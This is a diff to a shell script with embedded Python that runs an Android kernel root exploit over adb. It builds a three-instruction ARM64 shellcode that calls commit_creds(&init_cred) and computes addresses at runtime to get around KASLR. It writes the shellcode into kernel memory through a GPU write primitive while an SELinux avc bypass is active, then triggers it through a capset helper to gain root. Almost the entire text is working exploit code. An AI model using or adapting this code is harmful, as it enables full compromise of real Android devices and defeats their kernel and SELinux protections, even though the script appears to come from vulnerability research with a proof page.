@@ -67,7 +67,7 @@ restore() {
     echo "[final] restoring text + SELinux"
     anim_on >/dev/null 2>&1 || true
     local i a
-    for i in $(seq 0 12); do
+    for i in $(seq 0 2); do
         a=$(printf '0x%x' $((PATCH_ADDR + 4 * i)))
         wr_verified "$a" "0x${ORIG[$i]}" >/dev/null 2>&1 || echo "  restore[$i] $a unverified"
     done
@@ -113,16 +113,25 @@ IC=$(echo "$RT" | cut -d' ' -f1); CC=$(echo "$RT" | cut -d' ' -f2)
 echo "[final] init_cred_rt=$IC commit_creds_rt=$CC"
 
 # The 13-dword shellcode with runtime literals (d2/d3 = init_cred, d6/d7 = commit_creds)
+# 3-dword P1 patch: adrp x0,<init_cred page>; add x0,x0,#<off>; b commit_creds
+# Tail-calls commit_creds(&init_cred) with no literals, no KASLR dependency in the encodings
+# (ADRP/ADD/B are PC-relative / low-12 only), and only THREE writes instead of thirteen - which
+# matters because the avc bypass destabilises the system if left active for long.
 SC=$(python3 - "$IC" "$CC" <<'PY'
 import sys
 ic = int(sys.argv[1], 16); cc = int(sys.argv[2], 16)
-sc = [0x58000040, 0x14000003, ic & 0xffffffff, ic >> 32,
-      0x58000041, 0x14000003, cc & 0xffffffff, cc >> 32,
-      0xA9BF7BFD, 0xD63F0020, 0xA8C17BFD, 0x2A1F03E0, 0xD65F03C0]
-print(" ".join("%08x" % w for w in sc))
+pv = 0xffffffc008145af0 + (ic - 0xffffffc00a7b0ae0)      # patch site VA (link + slide)
+def adrp(rd, target, pc):
+    imm = ((target & ~0xfff) - (pc & ~0xfff)) >> 12
+    return 0x90000000 | ((imm & 3) << 29) | (((imm >> 2) & 0x7FFFF) << 5) | rd
+def addimm(rd, rn, imm12):
+    return 0x91000000 | ((imm12 & 0xfff) << 10) | (rn << 5) | rd
+def b(target, pc):
+    return 0x14000000 | (((target - pc) >> 2) & 0x03ffffff)
+print("%08x %08x %08x" % (adrp(0, ic, pv), addimm(0, 0, ic & 0xfff), b(cc, pv + 8)))
 PY
 )
-echo "[final] patching 13 dwords, ONE GPU op per process, entry last"
+echo "[final] patching 3 dwords (P1), one GPU op per process"
 i=0
 for v in $SC; do
     if [ "$i" = 12 ]; then :; fi
@@ -136,10 +145,10 @@ for v in $SC; do
     [ "$got" = "0x$v" ] || { echo "  dword $i = $got (want 0x$v)"; bad=$((bad+1)); }
     i=$((i + 1))
 done
-[ "$bad" = 0 ] && echo "  all 13 dwords confirmed by separate processes" || { echo "[final] $bad dwords wrong -> aborting"; exit 1; }
+[ "$bad" = 0 ] && echo "  all 3 dwords confirmed by separate processes" || { echo "[final] $bad dwords wrong -> aborting"; exit 1; }
 
 echo "[final] === TRIGGER (fresh process) ==="
-adb -s "$S" shell "/data/local/tmp/call_capset sh /data/local/tmp/proof.sh" </dev/null 2>&1 | tee "$LOG/root.txt" | tail -12
+adb -s "$S" shell "/data/local/tmp/call_capset" </dev/null 2>&1 | tee "$LOG/root.txt" | tail -14
 
 echo "[final] rendering proof page"
 adb_s 'am start -a android.intent.action.VIEW -d file:///sdcard/root-proof.html -t text/html' >/dev/null
